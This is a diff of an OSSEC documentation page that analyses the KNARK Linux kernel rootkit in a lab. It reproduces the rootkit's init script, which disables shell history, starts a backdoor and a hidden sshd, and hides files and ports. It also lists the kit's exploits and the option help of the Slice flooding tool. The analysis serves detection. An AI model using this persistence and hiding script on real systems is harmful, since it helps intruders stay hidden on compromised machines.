@@ -1,36 +1,24 @@
 <!DOCTYPE html>
 
-
-<html xmlns="http://www.w3.org/1999/xhtml">
+<html>
   <head>
-    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
-    
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Analysis of the KNARK Rootkit &#8212; OSSEC</title>
-    
-    <link rel="stylesheet" href="../../_static/basic.css" type="text/css" />
     <link rel="stylesheet" href="../../_static/pygments.css" type="text/css" />
+    <link rel="stylesheet" href="../../_static/bootstrap-sphinx.css" type="text/css" />
     <link rel="stylesheet" href="../../_static/bootstrap-3.2.0/css/bootstrap.min.css" type="text/css" />
     <link rel="stylesheet" href="../../_static/bootstrap-3.2.0/css/bootstrap-theme.min.css" type="text/css" />
     <link rel="stylesheet" href="../../_static/bootstrap-sphinx.css" type="text/css" />
     <link rel="stylesheet" href="../../_static/parallax.css" type="text/css" />
-    
-    <script type="text/javascript">
-      var DOCUMENTATION_OPTIONS = {
-        URL_ROOT:    '../../',
-        VERSION:     '3.3.0',
-        COLLAPSE_INDEX: false,
-        FILE_SUFFIX: '.html',
-        HAS_SOURCE:  true,
-        SOURCELINK_SUFFIX: '.txt'
-      };
-    </script>
-    <script type="text/javascript" src="../../_static/jquery.js"></script>
-    <script type="text/javascript" src="../../_static/underscore.js"></script>
-    <script type="text/javascript" src="../../_static/doctools.js"></script>
-    <script type="text/javascript" src="../../_static/js/jquery-1.11.0.min.js"></script>
-    <script type="text/javascript" src="../../_static/js/jquery-fix.js"></script>
-    <script type="text/javascript" src="../../_static/bootstrap-3.2.0/js/bootstrap.min.js"></script>
-    <script type="text/javascript" src="../../_static/bootstrap-sphinx.js"></script>
+    <script id="documentation_options" data-url_root="../../" src="../../_static/documentation_options.js"></script>
+    <script src="../../_static/jquery.js"></script>
+    <script src="../../_static/underscore.js"></script>
+    <script src="../../_static/doctools.js"></script>
+    <script src="../../_static/js/jquery-1.11.0.min.js"></script>
+    <script src="../../_static/js/jquery-fix.js"></script>
+    <script src="../../_static/bootstrap-3.2.0/js/bootstrap.min.js"></script>
+    <script src="../../_static/bootstrap-sphinx.js"></script>
     <link rel="author" title="About these documents" href="../../about.html" />
     <link rel="index" title="Index" href="../../genindex.html" />
     <link rel="search" title="Search" href="../../search.html" />
@@ -39,8 +27,37 @@
 <meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1'>
 <meta name="apple-mobile-web-app-capable" content="yes">
 
-  </head>
-  <body role="document">
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-138780766-1"></script>
+<script>
+window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
+
+gtag('config', 'UA-138780766-1');
+</script>
+
+<script type="text/javascript">
+  var _ss = _ss || [];
+  _ss.push(['_setDomain', 'https://koi-3QNN51VTHS.marketingautomation.services/net']);
+  _ss.push(['_setAccount', 'KOI-4APYNOYP8O']);
+  _ss.push(['_trackPageView']);
+  window._pa = window._pa || {};
+  // _pa.orderId = "myOrderId"; // OPTIONAL: attach unique conversion identifier to conversions
+  // _pa.revenue = "19.99"; // OPTIONAL: attach dynamic purchase values to conversions
+  // _pa.productId = "myProductId"; // OPTIONAL: Include product ID for use with dynamic ads
+  (function() {
+  var ss = document.createElement('script');
+  ss.type = 'text/javascript'; ss.async = true;
+  ss.src = ('https:' == document.location.protocol ? 'https://' : 'http://') + 'koi-3QNN51VTHS.marketingautomation.services/client/ss.js?ver=2.4.0';
+  var scr = document.getElementsByTagName('script')[0];
+  scr.parentNode.insertBefore(ss, scr);
+  })();
+  </script>
+
+
+
+  </head><body>
 
   <div id="navbar" class="navbar navbar-inverse navbar-default ">
     <div class="container">
@@ -59,9 +76,10 @@
         <div class="collapse navbar-collapse nav-collapse">
           <ul class="nav navbar-nav">
             
-                <li><a href="https://www.ossec.net/about/">About <i class="fa fa-info-circle"></i></a></li>
-                <li><a href="https://www.ossec.net/docs/">Documentation <i class="fa fa-book"></i></a></li>
-                <li><a href="https://www.ossec.net/downloads/">Downloads <i class="fa fa-download"></i></a></li>
+                <li><a href="https://www.ossec.net/about/">About</a></li>
+                <li><a href="https://www.ossec.net/docs/">Documentation</a></li>
+                <li><a href="https://www.ossec.net/register-for-ossec/">Get OSSEC+</a></li>
+                <li><a href="https://www.ossec.net/downloads/">Downloads</a></li>
             
             
               <li class="dropdown globaltoc-container">
@@ -160,7 +178,7 @@ huh?!) to look at and analyze.  After unzipping the file, I was presented with
 a bunch of files to look through and analyze.  Table 1 lists the files that come
 with KNARK:</p>
 <p>List of files that come with KNARK:</p>
-<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">Makefile</span>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Makefile</span>
 <span class="n">apache</span><span class="o">.</span><span class="n">c</span>
 <span class="n">Apache</span><span class="o">.</span><span class="n">cgi</span>
  <span class="n">backup</span>
@@ -210,16 +228,16 @@ with KNARK:</p>
 <p>After looking through some of the files, I decided to install the rootkit. Knark
 comes with a file named exec  when this file is executed a couple of things take place:</p>
 <ol class="arabic simple">
-<li>Creates the directories: /dev/.pizda and /dev/.pula (will not be able to
-see using ls. Use cd /dev/.pizda).</li>
-<li>Inserts sysmod.o. This is the module that allows the rootkit too stay
-hidden.</li>
-<li>KNARK also makes changes to the rcx.d S99local file. This causes the
-machine to fail at boot up.</li>
+<li><p>Creates the directories: /dev/.pizda and /dev/.pula (will not be able to
+see using ls. Use cd /dev/.pizda).</p></li>
+<li><p>Inserts sysmod.o. This is the module that allows the rootkit too stay
+hidden.</p></li>
+<li><p>KNARK also makes changes to the rcx.d S99local file. This causes the
+machine to fail at boot up.</p></li>
 </ol>
 <p>The first thing I did after installation is pull out NMAP and run
-<code class="docutils literal"><span class="pre">nmap</span> <span class="pre">-sS</span> <span class="pre">-p</span> <span class="pre">1-65535</span> <span class="pre">192.168.0.20</span></code> and waited to see what NMAP had too say.</p>
-<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">Starting</span> <span class="n">nmap</span> <span class="n">V</span><span class="o">.</span> <span class="mf">2.53</span> <span class="n">by</span> <span class="n">fyodor</span><span class="nd">@insecure</span><span class="o">.</span><span class="n">org</span> <span class="p">(</span> <span class="n">www</span><span class="o">.</span><span class="n">insecure</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">nmap</span><span class="o">/</span> <span class="p">)</span>
+<code class="docutils literal notranslate"><span class="pre">nmap</span> <span class="pre">-sS</span> <span class="pre">-p</span> <span class="pre">1-65535</span> <span class="pre">192.168.0.20</span></code> and waited to see what NMAP had too say.</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Starting</span> <span class="n">nmap</span> <span class="n">V</span><span class="o">.</span> <span class="mf">2.53</span> <span class="n">by</span> <span class="n">fyodor</span><span class="nd">@insecure</span><span class="o">.</span><span class="n">org</span> <span class="p">(</span> <span class="n">www</span><span class="o">.</span><span class="n">insecure</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">nmap</span><span class="o">/</span> <span class="p">)</span>
 <span class="n">Interesting</span> <span class="n">ports</span> <span class="n">on</span> <span class="n">sec</span><span class="o">-</span><span class="n">linux</span><span class="o">.</span><span class="n">lab</span><span class="o">.</span><span class="n">sec</span> <span class="p">(</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">0.20</span><span class="p">):</span>
 <span class="p">(</span><span class="n">The</span> <span class="mi">65523</span> <span class="n">ports</span> <span class="n">scanned</span> <span class="n">but</span> <span class="ow">not</span> <span class="n">shown</span> <span class="n">below</span> <span class="n">are</span> <span class="ow">in</span> <span class="n">state</span><span class="p">:</span> <span class="n">closed</span><span class="p">)</span>
 <span class="n">Port</span>       <span class="n">State</span>       <span class="n">Service</span>
@@ -241,11 +259,11 @@ machine to fail at boot up.</li>
 <p>Figure 1. NMAP results</p>
 <p>Figure 1 tells us a lot (good thing this box is in a lab and not in the wild : ).
 First, we see that there are two (2) ports that are unknown (18667 and 31221).
-Second, we see that this box is lucky it hasn&#8217;t been rooted at least a dozen times.</p>
+Second, we see that this box is lucky it hasn’t been rooted at least a dozen times.</p>
 <p>The next step was to run netstat.  Why?  Well, we want to see if netstat
 will call out the same ports as NMAP.  If netstat does not call out the same
 ports then we check the binary for netstat.:</p>
-<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">Active</span> <span class="n">Internet</span> <span class="n">connections</span> <span class="p">(</span><span class="n">servers</span> <span class="ow">and</span> <span class="n">established</span><span class="p">)</span>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Active</span> <span class="n">Internet</span> <span class="n">connections</span> <span class="p">(</span><span class="n">servers</span> <span class="ow">and</span> <span class="n">established</span><span class="p">)</span>
 <span class="n">Proto</span> <span class="n">Recv</span><span class="o">-</span><span class="n">Q</span> <span class="n">Send</span><span class="o">-</span><span class="n">Q</span> <span class="n">Local</span> <span class="n">Address</span>           <span class="n">Foreign</span> <span class="n">Address</span>         <span class="n">State</span>
 <span class="n">tcp</span>        <span class="mi">0</span>      <span class="mi">0</span> <span class="mf">0.0</span><span class="o">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">79</span>              <span class="mf">0.0</span><span class="o">.</span><span class="mf">0.0</span><span class="p">:</span><span class="o">*</span>               <span class="n">LISTEN</span>
 <span class="n">tcp</span>        <span class="mi">0</span>      <span class="mi">0</span> <span class="mf">0.0</span><span class="o">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">512</span>             <span class="mf">0.0</span><span class="o">.</span><span class="mf">0.0</span><span class="p">:</span><span class="o">*</span>               <span class="n">LISTEN</span>
@@ -278,17 +296,17 @@ ports then we check the binary for netstat.:</p>
 </pre></div>
 </div>
 <p>Figure 2: Netstat results</p>
-<p>Figure 2 is the results of a <code class="docutils literal"><span class="pre">netstat</span> <span class="pre">-a</span> <span class="pre">-n</span></code>. The output of netstat tells us that
+<p>Figure 2 is the results of a <code class="docutils literal notranslate"><span class="pre">netstat</span> <span class="pre">-a</span> <span class="pre">-n</span></code>. The output of netstat tells us that
 the two ports were not identified, so off we go to check the netstat binary.
 Checking netstat binary required three steps:</p>
 <ol class="arabic simple">
-<li>Run strings. This allows us to see if there is a hidden directory stored in
-the binary.  Checked it and there was no hidden directories.</li>
-<li>Md5sum. This step is common sense. Compared the computers netstat md5sum
-to a CD&#8217;s md5sum and no luck!! Both were the same.</li>
-<li>Run diff. Yes. . . this is redundant but we have nothing to lose and everything
-to gain. Unfortunately, the result is the same. Everything checks out OK.</li>
-<li>In the past if a box had a rootkit installed, an administrator could comb
+<li><p>Run strings. This allows us to see if there is a hidden directory stored in
+the binary.  Checked it and there was no hidden directories.</p></li>
+<li><p>Md5sum. This step is common sense. Compared the computers netstat md5sum
+to a CD’s md5sum and no luck!! Both were the same.</p></li>
+<li><p>Run diff. Yes… this is redundant but we have nothing to lose and everything
+to gain. Unfortunately, the result is the same. Everything checks out OK.</p></li>
+<li><p>In the past if a box had a rootkit installed, an administrator could comb
 through the binaries and find traces of the rootkit. Not so in this case.
 The KNARK rootkit actually hides within the kernel making this rootkit almost
 impossible to find and analyze. How is this being done? Well, attackers are able
@@ -296,26 +314,24 @@ to do this by using Loadable Kernel Modules (LKM). For anybody who has been
 in the Linux world you know that LKM.s are pieces of code that can be loaded
 into the operating system on demand. As a matter of fact it is encouraged that you
 use LKM.s in order to update your hardware for your OS. BTW, inserting modules
-into Linux is not that difficult, in fact <code class="docutils literal"><span class="pre">insmod</span> <span class="pre">-f</span></code> will do the job.</li>
+into Linux is not that difficult, in fact <code class="docutils literal notranslate"><span class="pre">insmod</span> <span class="pre">-f</span></code> will do the job.</p></li>
 </ol>
 <p>KNARK comes with some a few good exploits as well.</p>
 <ol class="arabic">
-<li><p class="first"><em>Lpdx</em> - This is used to exploit the LPR service of Red Hat boxes. Here
+<li><p><em>Lpdx</em> - This is used to exploit the LPR service of Red Hat boxes. Here
 is what a IDS might see:</p>
 <p>Figure 3: Lpr Signature:</p>
-<div class="highlight-default"><div class="highlight"><pre><span></span><span class="mi">09</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">19.991789</span> <span class="o">&gt;</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.13</span><span class="o">.</span><span class="mi">2894</span> <span class="o">&gt;</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">0.40</span><span class="o">.</span><span class="n">printer</span><span class="p">:</span> <span class="n">S</span> <span class="mi">4221747912</span><span class="p">:</span><span class="mi">4221747912</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="n">win</span> <span class="mi">32120</span> <span class="o">&lt;</span><span class="n">mss</span> <span class="mi">1460</span><span class="p">,</span><span class="n">sackOK</span><span class="p">,</span><span class="n">timestamp</span> <span class="mi">4058996</span> <span class="mi">0</span><span class="p">,</span><span class="n">nop</span><span class="p">,</span><span class="n">wscale</span> <span class="mi">0</span><span class="o">&gt;</span> <span class="p">(</span><span class="n">DF</span><span class="p">)</span> <span class="p">(</span><span class="n">ttl</span> <span class="mi">64</span><span class="p">,</span> <span class="nb">id</span> <span class="mi">11263</span><span class="p">)</span>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="mi">09</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">19.991789</span> <span class="o">&gt;</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.13</span><span class="o">.</span><span class="mi">2894</span> <span class="o">&gt;</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">0.40</span><span class="o">.</span><span class="n">printer</span><span class="p">:</span> <span class="n">S</span> <span class="mi">4221747912</span><span class="p">:</span><span class="mi">4221747912</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="n">win</span> <span class="mi">32120</span> <span class="o">&lt;</span><span class="n">mss</span> <span class="mi">1460</span><span class="p">,</span><span class="n">sackOK</span><span class="p">,</span><span class="n">timestamp</span> <span class="mi">4058996</span> <span class="mi">0</span><span class="p">,</span><span class="n">nop</span><span class="p">,</span><span class="n">wscale</span> <span class="mi">0</span><span class="o">&gt;</span> <span class="p">(</span><span class="n">DF</span><span class="p">)</span> <span class="p">(</span><span class="n">ttl</span> <span class="mi">64</span><span class="p">,</span> <span class="nb">id</span> <span class="mi">11263</span><span class="p">)</span>
 <span class="mi">09</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">19.993434</span> <span class="o">&lt;</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.13</span><span class="o">.</span><span class="n">printer</span> <span class="o">&gt;</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">0.40</span><span class="o">.</span><span class="mi">2894</span><span class="p">:</span> <span class="n">S</span> <span class="mi">397480959</span><span class="p">:</span><span class="mi">397480959</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="n">ack</span> <span class="mi">4221747913</span> <span class="n">win</span> <span class="mi">32120</span> <span class="o">&lt;</span><span class="n">mss</span> <span class="mi">1460</span><span class="p">,</span><span class="n">sackOK</span><span class="p">,</span><span class="n">timestamp</span> <span class="mi">393475</span> <span class="mi">4058996</span><span class="p">,</span><span class="n">nop</span><span class="p">,</span><span class="n">wscale</span> <span class="mi">0</span><span class="o">&gt;</span> <span class="p">(</span><span class="n">DF</span><span class="p">)</span> <span class="p">(</span><span class="n">ttl</span> <span class="mi">64</span><span class="p">,</span> <span class="nb">id</span> <span class="mi">3278</span><span class="p">)</span>
 <span class="mi">09</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">19.993514</span> <span class="o">&gt;</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">1.13</span><span class="o">.</span><span class="mi">2894</span> <span class="o">&gt;</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">0.40</span><span class="o">.</span><span class="n">printer</span><span class="p">:</span> <span class="o">.</span> <span class="mi">1</span><span class="p">:</span><span class="mi">1</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="n">ack</span> <span class="mi">1</span> <span class="n">win</span> <span class="mi">32120</span> <span class="o">&lt;</span><span class="n">nop</span><span class="p">,</span><span class="n">nop</span><span class="p">,</span><span class="n">timestamp</span> <span class="mi">4058996</span> <span class="mi">393475</span><span class="o">&gt;</span> <span class="p">(</span><span class="n">DF</span><span class="p">)</span> <span class="p">(</span><span class="n">ttl</span> <span class="mi">64</span><span class="p">,</span> <span class="nb">id</span> <span class="mi">11264</span><span class="p">)</span>
 </pre></div>
 </div>
 </li>
-<li><p class="first"><em>T666</em> - Used to exploit BIND 8.2.1.  This exploit is used against Linux
+<li><p><em>T666</em> - Used to exploit BIND 8.2.1.  This exploit is used against Linux
 and FreeBSD.  A common signature of this tool is there is usually a
-directory called /var/named/ADMROCKS.</p>
-</li>
-<li><p class="first"><em>Wugod</em> - This is an exploit for Washington University.s ftpd 2.6.0(1)
-for FREEBSD, Linux (RH 6.2 and SuSe 6.3&amp;6.4).</p>
-</li>
+directory called /var/named/ADMROCKS.</p></li>
+<li><p><em>Wugod</em> - This is an exploit for Washington University.s ftpd 2.6.0(1)
+for FREEBSD, Linux (RH 6.2 and SuSe 6.3&amp;6.4).</p></li>
 </ol>
 <p>Slice v2.1+, credits: sinkhole, sacred. Rewritten and 1+ by some lamerz :P</p>
 <p>### linux version</p>
@@ -323,100 +339,70 @@ for FREEBSD, Linux (RH 6.2 and SuSe 6.3&amp;6.4).</p>
 <blockquote>
 <div><p>Target      - the target we are trying to attack.</p>
 <p>Clones      - number of packets to send at once (use -f for more than 6).</p>
-<table class="docutils option-list" frame="void" rules="none">
-<col class="option" />
-<col class="description" />
-<tbody valign="top">
-<tr><td class="option-group">
-<kbd><span class="option">-f</span></kbd></td>
-<td><ul class="first last simple">
-<li>force usage of more than 6 clones.</li>
+<dl class="option-list">
+<dt><kbd><span class="option">-f</span></kbd></dt>
+<dd><ul class="simple">
+<li><p>force usage of more than 6 clones.</p></li>
 </ul>
-</td></tr>
-<tr><td class="option-group">
-<kbd><span class="option">-c</span></kbd></td>
-<td><ul class="first last simple">
-<li>class C flooding.</li>
+</dd>
+<dt><kbd><span class="option">-c</span></kbd></dt>
+<dd><ul class="simple">
+<li><p>class C flooding.</p></li>
 </ul>
-</td></tr>
-<tr><td class="option-group">
-<kbd><span class="option">-d <var>seconds</var></span></kbd></td>
-<td><ul class="first last simple">
-<li>time to flood in seconds (default 600, use 0 for no timeout).</li>
+</dd>
+<dt><kbd><span class="option">-d <var>seconds</var></span></kbd></dt>
+<dd><ul class="simple">
+<li><p>time to flood in seconds (default 600, use 0 for no timeout).</p></li>
 </ul>
-</td></tr>
-<tr><td class="option-group">
-<kbd><span class="option">-p <var>packets</var></span></kbd></td>
-<td><ul class="first last simple">
-<li>packets to send for each clone (if used with -d is ignored).</li>
+</dd>
+<dt><kbd><span class="option">-p <var>packets</var></span></kbd></dt>
+<dd><ul class="simple">
+<li><p>packets to send for each clone (if used with -d is ignored).</p></li>
 </ul>
-</td></tr>
-</tbody>
-</table>
+</dd>
+</dl>
 </div></blockquote>
-<table class="docutils option-list" frame="void" rules="none">
-<col class="option" />
-<col class="description" />
-<tbody valign="top">
-<tr><td class="option-group">
-<kbd><span class="option">-s <var>size</var></span></kbd></td>
-<td><ul class="first simple">
-<li>packet size (default 40, use 0 for random packets).</li>
+<dl class="option-list">
+<dt><kbd><span class="option">-s <var>size</var></span></kbd></dt>
+<dd><ul class="simple">
+<li><p>packet size (default 40, use 0 for random packets).</p></li>
 </ul>
 <p>-maxs size  - maximum size for random packets.</p>
-<table class="docutils option-list" frame="void" rules="none">
-<col class="option" />
-<col class="description" />
-<tbody valign="top">
-<tr><td class="option-group">
-<kbd><span class="option">-a <var>srcaddr</var></span></kbd></td>
-<td><ul class="first last simple">
-<li>the spoofed source address (random if not specified).</li>
+<dl class="option-list">
+<dt><kbd><span class="option">-a <var>srcaddr</var></span></kbd></dt>
+<dd><ul class="simple">
+<li><p>the spoofed source address (random if not specified).</p></li>
 </ul>
-</td></tr>
-<tr><td class="option-group">
-<kbd><span class="option">-l <var>lowport</var></span></kbd></td>
-<td><ul class="first last simple">
-<li>start port (1024 if not specified).</li>
+</dd>
+<dt><kbd><span class="option">-l <var>lowport</var></span></kbd></dt>
+<dd><ul class="simple">
+<li><p>start port (1024 if not specified).</p></li>
 </ul>
-</td></tr>
-</tbody>
-</table>
+</dd>
+</dl>
 <p>-h highport - end port (65535 if not specified).</p>
-<table class="docutils option-list" frame="void" rules="none">
-<col class="option" />
-<col class="description" />
-<tbody valign="top">
-<tr><td class="option-group">
-<kbd><span class="option">-i<var>ncports</var></span></kbd></td>
-<td><ul class="first last simple">
-<li>choose ports incremental (random if not specified).</li>
+<dl class="option-list">
+<dt><kbd><span class="option">-i<var>ncports</var></span></kbd></dt>
+<dd><ul class="simple">
+<li><p>choose ports incremental (random if not specified).</p></li>
 </ul>
-</td></tr>
-</tbody>
-</table>
+</dd>
+</dl>
 <p>-sleep ms   - delay between packets in miliseconds (0=no delay by default).</p>
-<table class="last docutils option-list" frame="void" rules="none">
-<col class="option" />
-<col class="description" />
-<tbody valign="top">
-<tr><td class="option-group">
-<kbd><span class="option">-s<var>yn</var></span></kbd></td>
-<td><ul class="first last simple">
-<li>use SYN instead ACK.</li>
+<dl class="option-list">
+<dt><kbd><span class="option">-s<var>yn</var></span></kbd></dt>
+<dd><ul class="simple">
+<li><p>use SYN instead ACK.</p></li>
 </ul>
-</td></tr>
-<tr><td class="option-group">
-<kbd><span class="option">-s<var>ynack</var></span></kbd></td>
-<td><ul class="first last simple">
-<li>use SYN|ACK.</li>
+</dd>
+<dt><kbd><span class="option">-s<var>ynack</var></span></kbd></dt>
+<dd><ul class="simple">
+<li><p>use SYN|ACK.</p></li>
 </ul>
-</td></tr>
-</tbody>
-</table>
-</td></tr>
-</tbody>
-</table>
+</dd>
+</dl>
+</dd>
+</dl>
 <p>Figure 4: Slice (sl2) help output</p>
 <p>As we can see this tool does allow an attacker the chance to randomize his | her packet(s).  This will make detecting a little harder.</p>
 <p>09:05:26.655215 &gt; 192.168.1.13 &gt; 192.168.0.40: (frag 33252:<a class="reference external" href="mailto:20&#37;&#52;&#48;256">20<span>&#64;</span>256</a>) [tos 0xe8]  (ttl 255)</p>
@@ -428,7 +414,8 @@ for FREEBSD, Linux (RH 6.2 and SuSe 6.3&amp;6.4).</p>
 <p>Figure 5: Results of Slice</p>
 <p>Looking at the help command will not assist us in detecting this program, so I decided to run the DOS.  Figure 5 shows us what slice looks like when it is ran.  Keep in mind that these signatures can change (this depends on the attacker and how the rootkit is installed).</p>
 <blockquote>
-<div>KNARK comes with many other tools that we have not discussed yet.  The first tool we will cover is gib.c.  This tool listens on port 18667 (takes care of one of the two ports we discovered using NMAP) and comes with a by default it has a password of Error and a ps of updated.  This program is just your typical .backdoor. program.  Next, we have a file called init.  This is a shell script BUT, it explains why this root kit is hard to detect.</div></blockquote>
+<div><p>KNARK comes with many other tools that we have not discussed yet.  The first tool we will cover is gib.c.  This tool listens on port 18667 (takes care of one of the two ports we discovered using NMAP) and comes with a by default it has a password of Error and a ps of updated.  This program is just your typical .backdoor. program.  Next, we have a file called init.  This is a shell script BUT, it explains why this root kit is hard to detect.</p>
+</div></blockquote>
 <p>#!/bin/sh</p>
 <p>unset HISTFILE</p>
 <p>export HISTFILE=/dev/null</p>
@@ -438,10 +425,10 @@ for FREEBSD, Linux (RH 6.2 and SuSe 6.3&amp;6.4).</p>
 <p>then</p>
 <p>/usr/bin/gib &amp; 1&gt;/dev/null 2&gt;/dev/null</p>
 <p>else</p>
-<p>echo &#8220;aaa&#8221; &gt;&gt;/dev/null</p>
+<p>echo “aaa” &gt;&gt;/dev/null</p>
 <p>fi</p>
 <p>/dev/.pizda/jesuscd -f /dev/.pizda/sshd_config -h /dev/.pizda/ssh_host_key -q 1&gt;/dev/null 2&gt;/dev/null</p>
-<p>cd &#8220;/dev/.pula&#8221; 1&gt;/dev/null 2&gt;/dev/null</p>
+<p>cd “/dev/.pula” 1&gt;/dev/null 2&gt;/dev/null</p>
 <p>./caine &gt;&gt; bashina &amp; 1&gt;/dev/null 2&gt;/dev/null</p>
 <p>cd /root</p>
 <p>killall -31 gib 1&gt;/dev/null 2&gt;/dev/null</p>
@@ -449,25 +436,25 @@ for FREEBSD, Linux (RH 6.2 and SuSe 6.3&amp;6.4).</p>
 <p>killall -31 caine 1&gt;/dev/null 2&gt;/dev/null</p>
 <p>/dev/.pizda/hidef /dev/.pizda 1&gt;/dev/null 2&gt;/dev/null</p>
 <p>/dev/.pizda/hidef /dev/.pula 1&gt;/dev/null 2&gt;/dev/null</p>
-<p>/dev/.pizda/nethide &#8221;:79F5&#8221; 1&gt;/dev/null 2&gt;/dev/null</p>
-<p>/dev/.pizda/nethide &#8221;:48EB&#8221; 1&gt;/dev/null 2&gt;/dev/null</p>
-<p>/dev/.pizda/nethide &#8221;:2FB5&#8221; 1&gt;/dev/null 2&gt;/dev/null</p>
-<p>/dev/.pizda/nethide &#8221;:1A01&#8221; 1&gt;/dev/null 2&gt;/dev/null</p>
-<p>/dev/.pizda/nethide &#8221;:1A02&#8221; 1&gt;/dev/null 2&gt;/dev/null</p>
-<p>/dev/.pizda/nethide &#8221;:1A03&#8221; 1&gt;/dev/null 2&gt;/dev/null</p>
-<p>/dev/.pizda/nethide &#8221;:1A04&#8221; 1&gt;/dev/null 2&gt;/dev/null</p>
-<p>/dev/.pizda/nethide &#8221;:1A05&#8221; 1&gt;/dev/null 2&gt;/dev/null</p>
-<p>/dev/.pizda/nethide &#8221;:1A06&#8221; 1&gt;/dev/null 2&gt;/dev/null</p>
-<p>/dev/.pizda/nethide &#8221;:1A07&#8221; 1&gt;/dev/null 2&gt;/dev/null</p>
-<p>/dev/.pizda/nethide &#8221;:1A08&#8221; 1&gt;/dev/null 2&gt;/dev/null</p>
-<p>/dev/.pizda/nethide &#8221;:1A09&#8221; 1&gt;/dev/null 2&gt;/dev/null</p>
-<p>/dev/.pizda/nethide &#8221;:1A0A&#8221; 1&gt;/dev/null 2&gt;/dev/null</p>
-<p>/dev/.pizda/nethide &#8221;:1A0B&#8221; 1&gt;/dev/null 2&gt;/dev/null</p>
-<p>/dev/.pizda/nethide &#8221;:1A0C&#8221; 1&gt;/dev/null 2&gt;/dev/null</p>
-<p>/dev/.pizda/nethide &#8221;:1A0D&#8221; 1&gt;/dev/null 2&gt;/dev/null</p>
-<p>/dev/.pizda/nethide &#8221;:1A0E&#8221; 1&gt;/dev/null 2&gt;/dev/null</p>
-<p>/dev/.pizda/nethide &#8221;:1A0F&#8221; 1&gt;/dev/null 2&gt;/dev/null</p>
-<p>/dev/.pizda/nethide &#8221;:029A&#8221; 1&gt;/dev/null 2&gt;/dev/null</p>
+<p>/dev/.pizda/nethide “:79F5” 1&gt;/dev/null 2&gt;/dev/null</p>
+<p>/dev/.pizda/nethide “:48EB” 1&gt;/dev/null 2&gt;/dev/null</p>
+<p>/dev/.pizda/nethide “:2FB5” 1&gt;/dev/null 2&gt;/dev/null</p>
+<p>/dev/.pizda/nethide “:1A01” 1&gt;/dev/null 2&gt;/dev/null</p>
+<p>/dev/.pizda/nethide “:1A02” 1&gt;/dev/null 2&gt;/dev/null</p>
+<p>/dev/.pizda/nethide “:1A03” 1&gt;/dev/null 2&gt;/dev/null</p>
+<p>/dev/.pizda/nethide “:1A04” 1&gt;/dev/null 2&gt;/dev/null</p>
+<p>/dev/.pizda/nethide “:1A05” 1&gt;/dev/null 2&gt;/dev/null</p>
+<p>/dev/.pizda/nethide “:1A06” 1&gt;/dev/null 2&gt;/dev/null</p>
+<p>/dev/.pizda/nethide “:1A07” 1&gt;/dev/null 2&gt;/dev/null</p>
+<p>/dev/.pizda/nethide “:1A08” 1&gt;/dev/null 2&gt;/dev/null</p>
+<p>/dev/.pizda/nethide “:1A09” 1&gt;/dev/null 2&gt;/dev/null</p>
+<p>/dev/.pizda/nethide “:1A0A” 1&gt;/dev/null 2&gt;/dev/null</p>
+<p>/dev/.pizda/nethide “:1A0B” 1&gt;/dev/null 2&gt;/dev/null</p>
+<p>/dev/.pizda/nethide “:1A0C” 1&gt;/dev/null 2&gt;/dev/null</p>
+<p>/dev/.pizda/nethide “:1A0D” 1&gt;/dev/null 2&gt;/dev/null</p>
+<p>/dev/.pizda/nethide “:1A0E” 1&gt;/dev/null 2&gt;/dev/null</p>
+<p>/dev/.pizda/nethide “:1A0F” 1&gt;/dev/null 2&gt;/dev/null</p>
+<p>/dev/.pizda/nethide “:029A” 1&gt;/dev/null 2&gt;/dev/null</p>
 <p>/dev/.pizda/hidef /usr/bin/gib 1&gt;/dev/null 2&gt;/dev/null</p>
 <p>/dev/.pizda/hidef /bin/rtty 1&gt;/dev/null 2&gt;/dev/null</p>
 <p>/dev/.pizda/hidef /tmp/pgr 1&gt;/dev/null 2&gt;/dev/null</p>
@@ -481,11 +468,11 @@ for FREEBSD, Linux (RH 6.2 and SuSe 6.3&amp;6.4).</p>
 <p>Figure 6: init file</p>
 <p>Figure 6 explains everything.  I would like to point out a few important lines in this script.</p>
 <ol class="arabic simple">
-<li>You can see where the attacker uses insmod .f to install sysmod.o.  Again, this allows the attacker to remain hidden.</li>
-<li>He uses killall .31 to hide gib, jessuscd and caine. In order to make them viewable you would have to enter killall .32(There is a link at the bottom of this paper that explains this concept in much more detail.).</li>
-<li>You see many references to /dev/.pizda/nethide. An example is:</li>
+<li><p>You can see where the attacker uses insmod .f to install sysmod.o.  Again, this allows the attacker to remain hidden.</p></li>
